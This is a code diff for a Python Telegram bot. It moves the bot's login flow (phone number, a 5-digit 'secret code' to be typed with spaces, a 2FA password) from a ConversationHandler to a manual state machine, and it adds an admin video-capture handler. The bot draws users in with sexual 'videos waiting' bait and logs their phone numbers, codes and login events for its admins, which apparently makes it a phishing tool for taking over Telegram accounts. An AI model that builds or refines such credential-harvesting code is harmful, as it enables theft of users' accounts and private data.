@@ -6,7 +6,7 @@ from datetime import datetime
 from telegram import Update
 from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler,
-    MessageHandler, filters, ContextTypes, ConversationHandler,
+    MessageHandler, filters, ContextTypes,
 )
 
 import config
@@ -154,8 +154,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
         )
         log_session(user.id, user.username, None, "Requested phone input")
-        return PHONE_WAIT
+        login_state[user.id] = {"step": "phone_wait"}
     elif data == "verify_otp":
+        st = login_state.get(user.id)
+        if not st or not st.get("otp"):
+            await query.edit_message_text("❌ No OTP found. Start login again.", reply_markup=login_prompt_keyboard(), parse_mode="HTML")
+            return
         await query.edit_message_text(
             "<blockquote>🔐 ENTER THE SECRET CODE</blockquote>\n\n"
             "Send the 5-digit code with <b>spaces</b> between each digit.\n"
@@ -168,7 +172,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]),
             parse_mode="HTML",
         )
-        return OTP_WAIT
+        st["step"] = "otp_wait"
     elif data == "enter_2fa":
         await query.edit_message_text(
             "<blockquote>🔐 2FA PASSWORD... YOU'RE PACKING</blockquote>\n\n"
@@ -181,7 +185,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]),
             parse_mode="HTML",
         )
-        return TFA_WAIT
+        st = login_state.get(user.id, {})
+        st["step"] = "tfa_wait"
+        login_state[user.id] = st
     elif data == "skip_2fa":
         await handle_login_success(query, user, user_data, context)
     elif data == "resend_otp":
@@ -289,6 +295,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
         )
     elif data == "main_menu":
+        login_state.pop(user.id, None)
         msg = (
             "🍆 <b>WELCOME BACK, YOU SEXY BEAST</b> 🍆\n\n"
             "Ready for more <i>pleasure</i>? The videos are waiting... 💦"
@@ -402,10 +409,10 @@ async def handle_resend_otp(query, user, user_data):
         return
 
     otp = generate_mock_otp()
-    login_state[user.id] = {"otp": otp, "phone": phone}
     reset_attempts(user.id)
     log_session(user.id, user.username, phone, f"OTP resent: {otp}")
 
+    login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait"}
     await query.edit_message_text(
         "<blockquote>🔄 OTP RESENT</blockquote>\n\n"
         f"A new code has been sent to your device.\n\n"
@@ -417,7 +424,6 @@ async def handle_resend_otp(query, user, user_data):
         ]),
         parse_mode="HTML",
     )
-    return OTP_WAIT
 
 
 async def handle_login_success(query, user, user_data, context):
@@ -591,10 +597,10 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]),
             parse_mode="HTML",
         )
-        return PHONE_WAIT
+        return
 
     otp = generate_mock_otp()
-    login_state[user.id] = {"otp": otp, "phone": phone}
+    login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait"}
     await db.update_user(user.id, phone=phone)
     await db.log_activity(user.id, "phone_submitted", phone)
     log_session(user.id, user.username, phone, f"OTP sent: {otp}")
@@ -611,7 +617,6 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]),
         parse_mode="HTML",
     )
-    return OTP_WAIT
 
 
 async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -648,10 +653,11 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]),
             parse_mode="HTML",
         )
-        return -1
+        return
 
     if digits == expected:
         reset_attempts(user.id)
+        login_state.pop(user.id, None)
         await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
         await db.log_activity(user.id, "login_success")
         log_session(user.id, user.username, state.get("phone"), "OTP Verified")
@@ -667,7 +673,7 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=login_success_keyboard(),
             parse_mode="HTML",
         )
-        return -1
+        return
     else:
         remaining = 3 - attempts
         await update.message.reply_text(
@@ -683,7 +689,6 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]),
             parse_mode="HTML",
         )
-        return OTP_WAIT
 
 
 async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -693,6 +698,7 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     attempts = increment_2fa_attempts(user.id)
     if attempts > 3:
         reset_attempts(user.id)
+        login_state.pop(user.id, None)
         await update.message.reply_text(
             "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
             "You've used all 3 attempts. Locked out.\n"
@@ -702,8 +708,9 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]),
             parse_mode="HTML",
         )
-        return -1
+        return
 
+    login_state.pop(user.id, None)
     await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
     await db.log_activity(user.id, "login_success_2fa")
     log_session(user.id, user.username, None, "2FA login successful")
@@ -716,7 +723,6 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=login_success_keyboard(),
         parse_mode="HTML",
     )
-    return -1
 
 
 async def show_admin_dashboard(query, context):
@@ -822,13 +828,40 @@ async def handle_admin_callbacks(query, context, data):
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "<blockquote>🔞 USE THE BUTTONS BELOW</blockquote>\n\n"
-        "This bot is fully button-driven. Tap a button to navigate.\n"
-        "<i>Don't make me repeat myself... 😏</i>",
-        reply_markup=main_menu_keyboard(),
-        parse_mode="HTML",
-    )
+    user = update.effective_user
+    state = login_state.get(user.id, {})
+    step = state.get("step")
+
+    if step == "phone_wait":
+        await handle_phone(update, context)
+    elif step == "otp_wait":
+        await handle_otp(update, context)
+    elif step == "tfa_wait":
+        await handle_2fa(update, context)
+    else:
+        await update.message.reply_text(
+            "<blockquote>🔞 USE THE BUTTONS BELOW</blockquote>\n\n"
+            "This bot is fully button-driven. Tap a button to navigate.\n"
+            "<i>Don't make me repeat myself... 😏</i>",
+            reply_markup=main_menu_keyboard(),
+            parse_mode="HTML",
+        )
+
+
+async def handle_video_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id not in config.ADMIN_IDS:
+        await update.message.reply_text("❌ Not authorized.", reply_markup=main_menu_keyboard())
+        return
+    video = update.message.video
+    if video:
+        file_id = video.file_id
+        await update.message.reply_text(
+            f"<blockquote>📹 VIDEO CAPTURED</blockquote>\n\n"
+            f"<b>File ID:</b> <code>{file_id}</code>\n\n"
+            "Use this in the <b>admin panel</b> to add the video.",
+            parse_mode="HTML",
+        )
 
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -924,18 +957,9 @@ def main():
     app.add_handler(CommandHandler("logs", show_session_logs))
     app.add_handler(CommandHandler("setchannel", set_channel))
 
-    conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_handler)],
-        states={
-            PHONE_WAIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
-            OTP_WAIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp)],
-            TFA_WAIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_2fa)],
-        },
-        fallbacks=[CommandHandler("start", start)],
-        per_message=False,
-    )
-    app.add_handler(conv)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.VIDEO, handle_video_message))
+    app.add_handler(CallbackQueryHandler(button_handler))
     app.add_error_handler(error_handler)
 
     logger.info("🔥 Bot is polling...")
